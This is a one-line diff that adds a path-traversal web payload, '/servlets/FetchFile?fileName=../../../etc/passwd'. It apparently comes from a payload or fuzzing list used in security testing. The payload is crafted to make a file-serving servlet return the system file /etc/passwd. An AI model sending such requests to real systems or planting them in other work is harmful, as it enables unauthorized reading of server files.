@@ -1,0 +1,1 @@
+/servlets/FetchFile?fileName=../../../etc/passwd
